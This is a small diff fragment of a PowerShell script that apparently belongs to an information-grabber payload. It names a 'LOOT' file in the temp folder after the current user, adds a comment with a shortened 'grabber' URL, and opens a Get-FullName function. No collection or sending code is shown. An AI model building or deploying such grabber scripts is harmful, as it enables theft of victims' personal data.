@@ -1,6 +1,7 @@
 $FileName = "$env:tmp/$env:USERNAME-LOOT-$(get-date -f yyyy-MM-dd_hh-mm).txt"
 
 #------------------------------------------------------------------------------------------------------------------------------------
+# URL : https://tinyurl.com/grabber3
 
 function Get-FullName {
 
